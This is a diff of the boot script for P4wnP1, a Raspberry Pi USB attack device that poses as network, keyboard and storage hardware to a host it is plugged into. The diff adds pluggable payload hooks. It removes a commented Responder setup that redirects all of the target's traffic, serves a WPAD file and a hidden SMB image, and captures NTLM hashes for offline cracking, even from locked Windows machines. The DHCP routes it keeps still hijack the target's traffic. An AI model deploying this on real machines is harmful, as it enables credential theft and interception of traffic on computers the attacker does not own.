@@ -38,26 +38,14 @@
 #	- in order to avoid that windows detects the RNDIS device as searial com port, we have to add in custom
 #	OS descriptors with compat_id=RNDIS and sub_compat_id=5162001
 
-# =======================
-# Configuration options
-# =======================
-
-# We choose an IP with a very small subnet (see comments in README.rst)
-IF_IP="172.16.0.1"
-IF_MASK="255.255.255.252"
-IF_DHCP_RANGE="172.16.0.2,172.16.0.3"
-
-# 120 attempts with 500ms delay to try to get link on either RNDIS or CDC ECM
-# If the Pi is booted stand alone and the script runs after user login (e.g. inserted into .profile)
-# the loop could be aborted with <CTRL> + <C>. If the script is integrated into an init.d script
-# it isn't possible to interrupt the loop, which runs for 60 seconds till boot continues. In this case
-# RETRY_COUNT_LINK_DETECTION could be reduced, with the disadvantage of the host having less time to initialize
-# drivers. If the target hasn't enough time to install drivers, this value should be raised.
-RETRY_COUNT_LINK_DETECTION=120
-
 
 # find working dir of script
 wdir=$( cd $(dirname $BASH_SOURCE[0]) && pwd)
+
+# include setup.cfg
+source $wdir/setup.cfg
+# include payload
+source $wdir/payloads/$PAYLOAD
 
 # ====================
 # USB Init
@@ -110,33 +98,37 @@ echo 0x80 > configs/c.1/bmAttributes #  USB_OTG_SRP | USB_OTG_HNP
 
 # create RNDIS function
 # =======================================================
+if $USE_RNDIS; then
 mkdir -p functions/rndis.usb0
 # set up mac address of remote device
 echo "42:63:65:13:34:56" > functions/rndis.usb0/host_addr
 # set up local mac address 
 echo "42:63:65:66:43:21" > functions/rndis.usb0/dev_addr
-
+fi
 
 # create CDC ECM function
 # =======================================================
+if $USE_ECM; then
 mkdir -p functions/ecm.usb1
 # set up mac address of remote device
 echo "42:63:65:12:34:56" > functions/ecm.usb1/host_addr
 # set up local mac address 
 echo "42:63:65:65:43:21" > functions/ecm.usb1/dev_addr
-
+fi
 
 # create HID function
 # =======================================================
+if $USE_HID; then
 mkdir -p functions/hid.g1
 echo 1 > functions/hid.g1/protocol
 echo 1 > functions/hid.g1/subclass
 echo 8 > functions/hid.g1/report_length
 cat $wdir/report_desc > functions/hid.g1/report_desc
-
+fi
 
 # Create USB Mass storage
 # ==============================
+if $USE_UMS; then
 mkdir -p functions/mass_storage.usb0
 echo 1 > functions/mass_storage.usb0/stall # allow bulk EPs
 echo 0 > functions/mass_storage.usb0/lun.0/cdrom # don't emulate CD-ROm
@@ -145,6 +137,7 @@ echo 0 > functions/mass_storage.usb0/lun.0/ro # write acces
 # this is slow, but unplugging the stick without unmounting works
 echo 0 > functions/mass_storage.usb0/lun.0/nofua 
 echo $wdir/USB_STORAGE/image.bin > functions/mass_storage.usb0/lun.0/file
+fi
 
 # Create ACM serial adapter (disable, use SSH)
 # ============================================
@@ -165,7 +158,7 @@ echo $wdir/USB_STORAGE/image.bin > functions/mass_storage.usb0/lun.0/file
 #
 #	To allow Windows to read the OS descriptors again, the according registry hive has to be
 #	deleted manually or USB descriptor values have to be cahnged (f.e. USB_PID).
-
+if $USE_RNDIS; then
 mkdir -p os_desc
 echo 1 > os_desc/use
 echo 0xbc > os_desc/b_vendor_code
@@ -174,93 +167,59 @@ echo MSFT100 > os_desc/qw_sign
 mkdir -p functions/rndis.usb0/os_desc/interface.rndis
 echo RNDIS > functions/rndis.usb0/os_desc/interface.rndis/compatible_id
 echo 5162001 > functions/rndis.usb0/os_desc/interface.rndis/sub_compatible_id
-
+fi
 
 # bind function instances to respective configuration
 # ====================================================
+
+if $USE_RNDIS; then
 ln -s functions/rndis.usb0 configs/c.1/ # RNDIS on config 1 # RNDIS has to be the first interface on Composite device
+fi
+
+if $USE_HID; then
 ln -s functions/hid.g1 configs/c.1/ # HID on config 1
+fi
+
+if $USE_ECM; then
 ln -s functions/ecm.usb1 configs/c.1/ # ECM on config  1
+fi
+
+if $USE_UMS; then
 ln -s functions/mass_storage.usb0 configs/c.1/ # USB Mass Storage on config  1
+fi
+
 #ln -s functions/acm.GS0 configs/c.1/ # USB Mass Storage on config  1
 
+if $USE_RNDIS; then
 ln -s configs/c.1/ os_desc # add config 1 to OS descriptors
-
+fi
 
 # check for first available UDC driver
 UDC_DRIVER=$(ls /sys/class/udc | cut -f1 | head -n 1)
 # bind USB gadget to this UDC driver
 echo $UDC_DRIVER > UDC
 
+
+function detect_usb_hostmode()
+{
+	otg=$(sudo grep "DCFG=0x00000000" /sys/kernel/debug/20980000.usb/state)
+	if [ "$otg" != "" ]; then
+		echo "USB OTG Mode"
+		echo "As P4wnP1 is detected to run in Host (interactive) mode, we abort device setup now!"
+		exit
+	fi
+}
+
+detect_usb_hostmode
+
+
 # =================================
 # Network init
 # =================================
 
-# bring up both interfaces to check for physical link
-ifconfig usb0 up
-ifconfig usb1 up
-
-# Waiting for one of the interfaces to get a link (either RNDIS or ECM)
-#    loop count is limited by $RETRY_COUNT_LINK_DETECTION, to continue execution if this is used 
-#    as blocking boot script
-#    note: if the loop count is too low, windows may not have enough time to install drivers
-
-# ToDo: check if operstate could be used for this, without waiting for carrieer
-device="none"
-count=0
-while [[ $count -lt $RETRY_COUNT_LINK_DETECTION ]]; do
-	echo "Check $count of $RETRY_COUNT_LINK_DETECTION"
-	echo "========================="
-	echo "Operstate usb0 $(cat /sys/class/net/usb0/operstate)"
-	echo "Operstate usb1 $(cat /sys/class/net/usb1/operstate)"
-
-	if [[ $(</sys/class/net/usb0/carrier) == 1 ]]; then
-		# special case: macOS/Linux Systems detecting RNDIS should use CDC ECM anyway
-		# make sure ECM hasn't come up, too
-		sleep 0.5
-		if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
-			echo "Link detected on usb1"; sleep 2
-			device="usb1"
-			ifconfig usb0 down
-
-			break
-		fi
-
-		echo "Link detected on usb0"; sleep 2
-		device="usb0"
-		ifconfig usb1 down
-
-		break
-	fi
-
-	# check ECM for link
-	if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
-		echo "Link detected on usb1"; sleep 2
-		device="usb1"
-		ifconfig usb0 down
-
-		break
-	fi
-
-	# check RNDIS for link
-
-	sleep 0.5
-	let count=count+1
-#	echo $device
-done
-
-echo "Device selected: $device"
-
-# if here we have link on $device or we hit the retry limit (neither RNDIS nor CDC ECM are connected)
-if [ "$device" != "none" ]; then
-
-	# setup interface with correct IP
-	ifconfig $device $IF_IP netmask $IF_MASK
-
-	# remove old DHCP leases
-	rm /var/lib/misc/dnsmasq.leases 2> /dev/null
-
-	# update dnsmasq DHCP setup
+function start_DHCP_server()
+{
+	# recreate DHCP config
 cat << EOF > $wdir/dnsmasq.conf
 port=0
 listen-address=$IF_IP
@@ -282,69 +241,115 @@ dhcp-option=121,0.0.0.0/1,$IF_IP,128.0.0.0/1,$IF_IP
 # routes static (route 128.0.0.1 to 255.255.255.254 through our device)
 dhcp-option=249,0.0.0.0/1,$IF_IP,128.0.0.0/1,$IF_IP
 
-dhcp-leasefile=/var/lib/misc/dnsmasq.leases
+dhcp-leasefile=/tmp/dnsmasq.leases
 dhcp-authoritative
 log-dhcp
 EOF
-	# Enabeling of IPv4 kernel routing isn't needed to acces packets on the nat chain, thus we leave it turned off
-	#echo 1 > /proc/sys/net/ipv4/ip_forwarding
 
-	# example rule to redirect TCP port 80 to a custom service on 127.0.0.1:8080 instead of Responder's webserver
-	#	usage examples in case you're getting out of ideas: mitmproxy, metasploit, sslsplit, PoisonTap nodejs app...
-	#iptables -t nat -A PREROUTING -i $device -p tcp --dport 80 -j REDIRECT --to-port 8080
-
-	# redirect all traffic meant to be routed out through the Raspberry to localhost (127.0.0.1)
-	# 	this for example fetches traffic to DNS servers, which aren't overwritten by our DHCP lease
-	#	an UDP request to 8.8.4.4:53 from our target would end up here on 127.0.0.1:53, thanks to
-	#	the static routes for 0.0.0.0/1 and 128.0.0.0/1
-	iptables -t nat -A PREROUTING -i $device -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
-	iptables -t nat -A PREROUTING -i $device -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
-
+	# setup interface with correct IP
+	ifconfig $active_interface $IF_IP netmask $IF_MASK
 
 	# start DHCP server (listening on IF_IP)
 	dnsmasq -C $wdir/dnsmasq.conf
+}
 
-	# add route back through target (for ICS)
-	route add -net default gw 172.16.0.2
-
-# ========================================
-# Attack target through established Network
-# (all nifty ideas should be deployed here
-# ========================================
+function detect_active_interface()
+{
 
 
-	# Example setup
-	# -----------------
-	#
-	# The customized Responder (https://github.com/mame82/Responder, branch: EMULATE_INTERNET_AND_WPAD_ANYWAY) 
-	# runs the following setup:
-	#	1) DNS, LLMNR and NBT-NS enabled: As all packets arrive here, every possible hostname resolves to 172.16.0.1
-	#	no matter which name resolution technique is used by the target. This could be tested from the target by running:
-	#		$ ping <somerandomhostname>
-	#	2) Fingerprinting (OS discovery is enabled)
-	#	3) HTTP requests to any IP / hostname / domainname are redirected to Responder and served with a custom
-	#	HTML page (/home/pi/Responder/filles/AccessDenied.html). This file contains an invisible image referencing
-	#	a SMB share at \\spoofsmb\.
-	#	4) SMB requests (including the one to SPOOFSMB) are redirected to Responder and the client is forced to 
-	#	authenticate to a random challenge. NTLM hash of the user gets logged along with the provided challenge for offline
-	#	cracking in /home/pi/Responder/logs and /home/pi/Responder/Responder.db
-	#	5) Requests to wpad.dat are answered with a forced NTLM authentication (customized Responder needed to do this
-	#	while serving HTTP files). Such an request is issued everytime the host connects, because the WPAD server is
-	#	provided via DHCP. Windows Domain Clients without MS16-112 patch send the NTLM hash, even if the screen is locked.
-	#	This is basically the attack presented by Mubix.
-	#	6) Connectivity tests of Windows 7 and Windows 10 clients are answered correctly, thus the OS believes an Internet
-	#	connection is present on the interface (customized Responder needed to do this)
-	#	7) All other responder servers IMAP/POP3/FTP ... are running, too
-	# 	8) Responder runs in a screen session, thus the output could be attached to a SSH session on the Pi:
-	#		$ ssh pi@172.16.0.1
-	#		$ sudo screen -d -r
-	screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $device -f -v -w -F"
+	# Waiting for one of the interfaces to get a link (either RNDIS or ECM)
+	#    loop count is limited by $RETRY_COUNT_LINK_DETECTION, to continue execution if this is used 
+	#    as blocking boot script
+	#    note: if the loop count is too low, windows may not have enough time to install drivers
+
+	# ToDo: check if operstate could be used for this, without waiting for carrieer
+	active_interface="none"
+	if $USE_RNDIS && $USE_ECM; then
+		# bring up both interfaces to check for physical link
+		ifconfig usb0 up
+		ifconfig usb1 up
+
+		echo "CDC ECM and RNDIS active. Check which interface has to be used via Link detection"
+		while [ "$active_interface" == "none" ]; do
+		#while [[ $count -lt $RETRY_COUNT_LINK_DETECTION ]]; do
+			printf "."
+
+			if [[ $(</sys/class/net/usb0/carrier) == 1 ]]; then
+				# special case: macOS/Linux Systems detecting RNDIS should use CDC ECM anyway
+				# make sure ECM hasn't come up, too
+				sleep 0.5
+				if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
+					echo "Link detected on usb1"; sleep 2
+					active_interface="usb1"
+					ifconfig usb0 down
+
+					break
+				fi
+
+				echo "Link detected on usb0"; sleep 2
+				active_interface="usb0"
+				ifconfig usb1 down
+
+				break
+			fi
+
+			# check ECM for link
+			if [[ $(</sys/class/net/usb1/carrier) == 1 ]]; then
+				echo "Link detected on usb1"; sleep 2
+				active_interface="usb1"
+				ifconfig usb0 down
+
+				break
+			fi
+
+			# check RNDIS for link
+
+			sleep 0.5
+		done
+	fi
+
+	# if eiter one, RNDIS or ECM is active, wait for link on one of both
+	if ($USE_RNDIS && ! $USE_ECM) || (! $USE_RNDIS && $USE_ECM); then 
+		# bring up interface
+		ifconfig usb0 up
+
+		echo "CDC ECM or RNDIS active. Check which interface has to be used via Link detection"
+		while [ "$active_interface" == "none" ]; do
+			printf "."
+
+			if [[ $(</sys/class/net/usb0/carrier) == 1 ]]; then
+				echo "Link detected on usb0"; sleep 2
+				active_interface="usb0"
+				break
+			fi
+		done
+	fi
+
+	# if active_interface not "none" (RNDIS or CDC ECM are running)
+	if [ "$active_interface" != "none" ]; then
+		# setup DHCP server
+		start_DHCP_server
+
+		# call onNetworkUp() from payload
+		onNetworkUp
+
+		# wait for client to receive DHCP lease
+		target_ip=""
+		while [ "$target_ip" == "" ]; do
+			target_ip=$(cat /tmp/dnsmasq.leases | cut -d" " -f3)
+		done
+
+		# call onNetworkUp() from payload
+		onTargetGotIP
+	fi
+
+}
 
 
-else
-	# device is None (thus neither RNDIS nor CDC ECM is running)
-	echo "Disabling devices again, because neither has link"
-	ifconfig usb0 down
-	ifconfig usb1 down
-	sleep 1
-fi
+
+(
+	detect_active_interface
+	# call back on payload
+	onBootFinished
+)&
+
